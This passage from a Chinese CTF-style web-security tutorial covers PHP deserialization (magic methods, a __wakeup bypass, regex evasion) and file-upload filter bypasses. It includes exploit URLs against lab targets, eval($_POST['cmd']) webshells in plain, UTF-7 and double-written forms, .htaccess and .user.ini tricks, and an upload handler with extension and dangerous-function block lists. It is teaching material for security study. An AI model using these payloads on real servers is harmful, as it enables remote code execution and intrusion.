$c;</span><br></pre></td></tr></table></figure>

<p>输出<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125;</code></p>
<p>其中O表示存储的对象(object类型)，1代表对象名称有1个字符，即A，1表示有一个值，s代表string类型，4代表字符串长度，即test，依此类推。</p>
<img src="http://img.kawhi.xyz/image-20200711123022767.png" style="high:80%;width:80%;" />

<p>可以看到直接导致xss攻击，如果<code>__wakeup</code>中不是<code>echo()</code>，而是<code>eval()</code>那么就是任意代码执行，危害就更大了。</p>
<h4 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h4><p>通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</p>
<p><code>__construct</code> 当一个对象创建时自动调用</p>
<p><code>__wakeup</code> 使用unserialse()函数时会自动调用</p>
<p><code>__destruct</code> 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)</p>
<p><code>__toString</code> 当一个对象被当作一个字符串被调用。</p>
<p><code>__sleep()</code> 使用serialize()函数时触发</p>
<p><code>__call()</code>  在对象上下文中调用不可访问的方法时触发 </p>
<p><code>__callStatic()</code> 在静态上下文中调用不可访问的方法时触发</p>
<p><code>__get()</code> 用于从不可访问的属性读取数据</p>
<p><code>__set()</code> 用于将数据写入不可访问的属性</p>
<p><code>__isset()</code> 在不可访问的属性上调用isset()或empty()触发 </p>
<p><code>__unset()</code> 在不可访问的属性上使用unset()时触发</p>
<p><code>__toString()</code> 把类当作字符串使用时触发,返回值需要为字符串</p>
<p><code>__invoke()</code> 当脚本尝试将对象调用为函数时触发</p>
<p>这里再看看一些常用的魔术是如何被调用的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $varr1 = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $varr2 = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">echoP</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;varr1.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;varr1&#x27;</span>,<span class="string">&#x27;varr2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;__wakeup&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> test();<span class="comment">//实例化对象，调用__construct()方法，输出__construct</span></span><br><span class="line">$obj-&gt;echoP();    <span class="comment">//调用echoP()方法，输出&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">echo</span> $obj;        <span class="comment">//obj对象被当做字符串输出，调用__toString()方法，输出__toString</span></span><br><span class="line">$s =serialize($obj);   <span class="comment">//obj对象被序列化，调用__sleep()方法，输出__sleep</span></span><br><span class="line"><span class="keyword">echo</span> unserialize($s);  <span class="comment">//$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被 当做字符串，就会调用_toString()方法。 // 脚本结束又会调用__destruct()方法，输出__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="unserialize1"><a href="#unserialize1" class="headerlink" title="unserialize1"></a>unserialize1</h4><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">XianZhi</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造序列化代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XianZhi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> XianZhi();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28645&#x2F;?a&#x3D;O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;&#x2F;flag&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="OC绕过、wake-up绕过"><a href="#OC绕过、wake-up绕过" class="headerlink" title="OC绕过、wake up绕过"></a>OC绕过、wake up绕过</h4><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the f15g_1s_here.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize($var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>这里首先有两个要绕过的点</p>
<p>第一个点是<code>__wakeup()</code>，因为这里正常反序列化会写死<code>$this-&gt;ﬁle</code>属性为 index.php，但是php存在这么一个漏洞（CVE-2016-7124），当实际对象不等于反序列化的对象数时候会过<code>wakeup()</code>。</p>
<p>第二个点是正则匹配，这里的正则匹配的意思是如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式)就die掉，这里匹配的是<code>O:4</code>，直接使用+号当做空格即可绕过，即<code>O:+4</code>即可绕过。</p>
<p>构造序列化代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Demo(<span class="string">&#x27;f15g_1s_here.php&#x27;</span>);</span><br><span class="line">$a = serialize($a).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$a = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,$a);</span><br><span class="line">$a  =  str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQo=</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.107.126.173:28628&#x2F;?var&#x3D;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQo&#x3D;</span><br></pre></td></tr></table></figure>

<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>文件上传漏洞是web安全中经常利用到的一种漏洞形式。</p>
<p>一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中，再通过url去访问以执行代码。</p>
<p>通常造成文件上传漏洞的原因是</p>
<ul>
<li>对于上传文件的后缀名（扩展名），类型，以及内容没有做好严格的限制等等一些原因。</li>
</ul>
<p>下面介绍一些文件上传漏洞的绕过方法</p>
<h4 id="htaccess任意文件解析"><a href="#htaccess任意文件解析" class="headerlink" title=".htaccess任意文件解析"></a>.htaccess任意文件解析</h4><ul>
<li><p>当服务器是上传使用的是黑名单机制，但是锁死了不给上传php后缀的文件，我们可以使用.htaccess文件重新配置当前文件的解析后缀为其他后缀绕过导致其他后缀的文件被解析为php。导致远程代码执行。</p>
</li>
<li><p>.htaccess文件配置信息,这里将后缀为.aaa的文件均解析为php文件</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br></pre></td></tr></table></figure>

<ul>
<li>上传抓包上传.htaccess文件</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/QQ%E6%88%AA%E5%9B%BE20200716100155.png" alt="QQ截图20200716100155"></p>
<ul>
<li>上传1.aaa其内容为php文件即可</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716100505.png" alt="微信截图_20200716100505"></p>
<ul>
<li><code>Cat /flag</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716100628.png" alt="微信截图_20200716100628"></p>
<h4 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h4><ul>
<li>PHP5中还支持其他标识符</li>
<li>JS风格</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>短标签风格</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;?=?&gt;</code>与<code>&lt;?php echo ....?&gt;</code>等效</li>
<li>ASP风格</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% phpinfo();%&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>官方默认风格</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>假设<code>&lt;?php</code> 被被过滤，同时PHP版本为5可以使用以上标签绕过。短标签默认开启。如靶机<code>upload2</code>就短标签<code>&lt;?</code>进行了过滤，那么可以使用<code>asp风格</code>标签进行绕过。</p>
</li>
<li><p>如靶机Upload2在上传文件时候提示<code>Can&#39;t upload php file</code></p>
</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716132630.png" alt="微信截图_20200716132630"></p>
<ul>
<li>这时候将<code>&lt;?php</code>删掉并没有提示<code>Can&#39;t upload php file</code></li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716133026.png" alt="微信截图_20200716133026"></p>
<ul>
<li>这时候改成点标签即可绕过：</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716133238.png" alt="微信截图_20200716133238"></p>
<ul>
<li>查看页面执行成功</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716133317.png" alt="微信截图_20200716133317"></p>
<h4 id="特殊编码绕过-UTF-7"><a href="#特殊编码绕过-UTF-7" class="headerlink" title="特殊编码绕过(UTF-7)"></a>特殊编码绕过(UTF-7)</h4><ul>
<li>如果程序过滤了所有标签形式、或者说过滤了<code>&lt;?</code>而且PHP是在PHP7以上版本（PHP7已经将其他标签形式过淘汰，仅剩下<code>&lt;?php</code>形式），这时候可以使用<code>htaccess</code>解码对应的文件，例如我们可以使用UTF-7进行解码：(<a target="_blank" rel="noopener" href="http://toolswebtop.com/text/process/encode/utf-7%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E7%BC%96%E7%A0%81%E5%92%8C%E8%A7%A3%E7%A0%81UTF-7%EF%BC%89">http://toolswebtop.com/text/process/encode/utf-7这个网站可以编码和解码UTF-7）</a></li>
<li>.htaccess</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_flag display_errors on</span><br><span class="line">php_flag zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>1.aaa</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4-</span><br></pre></td></tr></table></figure>

<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>

<h4 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h4><ul>
<li>如果上传目录下有一个php文件，可以使用.user.ini将我们制定文件包含到我们目录下的所有PHP文件导致远程代码执行</li>
<li>.user.ini</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;a.jpg</span><br></pre></td></tr></table></figure>

<h4 id="htaccess文件换行绕过"><a href="#htaccess文件换行绕过" class="headerlink" title=".htaccess文件换行绕过"></a>.htaccess文件换行绕过</h4><ul>
<li>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716231058.png" alt="微信截图_20200716231058"></p>
<ul>
<li>.htaccess支持换行编写所以使用换行可以直接上传成功并解析</li>
</ul>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716231357.png" alt="微信截图_20200716231357"></h2><ul>
<li>上传1.abc成功Getshell</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716231504.png" alt="微信截图_20200716231504"></p>
<h4 id="文件包含解码Base64"><a href="#文件包含解码Base64" class="headerlink" title="文件包含解码Base64"></a>文件包含解码Base64</h4><ul>
<li>.htaccess</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot;</span><br></pre></td></tr></table></figure>

<h4 id="动态拼接函数绕过函数过滤"><a href="#动态拼接函数绕过函数过滤" class="headerlink" title="动态拼接函数绕过函数过滤"></a>动态拼接函数绕过函数过滤</h4><blockquote>
<p>靶机Upload7</p>
</blockquote>
<ul>
<li>使用扫描器扫描发现存在备份文件</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232655.png" alt="微信截图_20200716232655"></p>
<ul>
<li>下载备份文件</li>
</ul>
<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200716232734.png" alt="微信截图_20200716232734"></p>
<ul>
<li>把<code>.index.php.swp</code>放到linux下使用vim -r恢复</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim -r index.php.swp</span><br></pre></td></tr></table></figure>

<ul>
<li>得到源代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;../upload&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>($i=strlen($s)<span class="number">-1</span>;$i&gt;<span class="number">0</span>;$i--)&#123;</span><br><span class="line">                $c=substr($s,$i,<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>($i == strlen($s)<span class="number">-1</span> <span class="keyword">and</span> $c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> $s;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>($c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> substr($s,<span class="number">0</span>,$i+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload=<span class="literal">false</span>;</span><br><span class="line">$msg=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext=<span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        $file_name=trim($_FILES[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name=deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext=strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext=strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext=str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext=trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file=$_FILES[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            </span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&quot;/(phpinfo|system\(|eval\(|file_put_contents|file_get_contents|passthru|exec\(|chroot|scandir|proc_open|delfolder|unlink|mkdir|fopen|fread|fwrite|fputs|tmpfile|flock|chmod|delete|assert|_post|_get|_request|_file|create_function|array_walk|preg_replace|cookie)/Ui&quot;</span>,file_get_contents($temp_file)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不能含有危险函数！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) 